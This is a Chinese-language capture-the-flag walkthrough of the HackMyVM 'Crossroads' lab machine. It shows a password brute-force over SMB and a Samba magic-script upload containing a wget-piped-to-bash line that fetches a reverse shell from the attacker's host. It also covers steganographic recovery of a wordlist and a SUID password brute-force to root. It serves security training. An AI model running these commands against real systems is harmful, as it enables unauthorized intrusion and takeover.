# Crossroads

2024-11-09 https://hackmyvm.eu/machines/machine.php?vm=Crossroads

## IP

192.168.5.40

## Scan

```
PORT    STATE SERVICE
80/tcp  open  http
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds
```

先看 445 smb，发现共享目录 smbshare，但是不能访问。

访问 80 web，robotx.txt 中提示 /crossroads.png，是一个图片

http://192.168.5.40/note.txt 中提示：

```
just find three kings of blues
then move to the crossroads
-------------------------------
-abuzerkomurcu
```

提示出一个用户名，还是什么都没找到，在看上面 smb 把，使用 enum4linux -a 192.168.5.40 发现了一个用户名：albert，使用大字典进行爆破，发现密码：

```
medusa -u albert -P /usr/share/wordlists/rockyou.txt -M smbnt  -h 192.168.5.40 -v 4

User: albert Password: bradley1
```

使用找到的密码登陆 smb：

```
smbclient //192.168.5.40/smbshare/ -U albert
```

进入后发现只有一个文件 smb.conf 查看其内容：

```
path = /home/albert/smbshare
valid users = albert
browsable = yes
writable = yes
read only = no
magic script = smbscript.sh
guest ok = no
```

发现有写权限，并且配置了 smbscript.sh 可以将反弹的 shell 写入到 smbscript.sh 中，上传到 smb 时就会得到反弹的 shell：

```
#!/bin/bash

wget -q -O - http://192.168.5.3/5-3/8888.sh|bash
```

得到反弹的 shell 后，找到了 user flag：

```
albert@crossroads:/home/albert$ cat user.txt
912D12370BBCEA67BF28B03BCB9AA13F
```

寻找提升至 root 的路径，home 目录下发现 suid 程序 beroot ，回传至 kali 进行逆向分析：

```
undefined8 main(void)
{
    setuid(0);
    system("/bin/bash /root/beroot.sh");
    return 0;
}
```

但是没有权限读取 /root/beroot.sh ，运行后输入的密码也不知道是什么，发现 home 目录下也有一个 crossroads.png 图片，但是与/var/www/html 中的那个图片不同，多了 0.5M，下载下来进行隐写分析,由于是 png 格式，所以使用 zsteg：

```
zsteg 1.png

"lakers1\ngirls\nbob123\nbabypink\n12369874\ntiago\nshanna\nmonroe\nleilani\nlarry\nkontol\nhogwarts\nasakapa\nneopets\nmeowmeow\nloveit\nkipper\nilovedan\n313131\ntrunks\nplayboy123\nmyhoney\njustdoit\ngutierrez\nelijah1\nbeaver\nmy2kids\nmendez\nmaximo\nloveforever\nkitten1\njonalyn\ngu"
```

上面一串字符，看着像是密码，将其保存到目标机器上的 pass 文本文件中，然后执行下面的脚本尝试运行 beroot：

```
for i in $(cat pass);do echo $i|./beroot;done
```

但是没成功，后来找到了另一个隐写软件进行分析：

```
stegoveritas crossroads1.png
```

在生成的 result 文件夹中进入 keeper 文件夹，其中有两个文件的内容是一样的，其他文件都是 FF 文件 with very long lines (65536)，无用：

```
1731158767.925052-a354c0efdf9c7b676c8fa89f9edf8dfe: ISO-8859 text   <-------
1731158771.4351501-48c3cf22e63106478c6af35249afbfe9: ISO-8859 text, with very long lines (65536), with no line terminators
1731158772.0008967-844176c52c0f1e08015ca814f9c752fc: ISO-8859 text, with very long lines (65536), with no line terminators
1731158772.1984549-cd2835fe5d6eaf972582c1333dd59971: ISO-8859 text, with very long lines (65536), with no line terminators
1731158772.4797788-5da361d37ce31196adc876c7e0426b0e: ISO-8859 text, with very long lines (65536), with no line terminators
1731158772.7933688-e99a5bc84a6dd46c673945fa5bc8fb7c: ISO-8859 text, with very long lines (65536), with no line terminators
1731158772.980351-d712bcfe0eae3bfc69f67aa2beefe2e3: ISO-8859 text   <-------
1731158773.2024136-ff2a0567b731da50c4321c8adc5eb29c: ISO-8859 text, with very long lines (65536), with no line terminators
1731158773.7935462-b58049ebf5394e690139c3ebaab5b081: ISO-8859 text, with very long lines (65536), with no line terminators
1731158774.2357607-9ec0907aab6a8c5b5c6f41a3903d92a5: ISO-8859 text, with very long lines (65536), with no line terminators
```

将其拷贝到目标机器上，再次运行上面的脚本，找到了 root 的密码：

```
albert@crossroads:/home/albert$ cat rootcreds
root
___drifting___
```

最终获得了 root flag：

```
root@crossroads:~# cat root.txt
876F96716C3606B09A89F0FA3C1D52EB
```
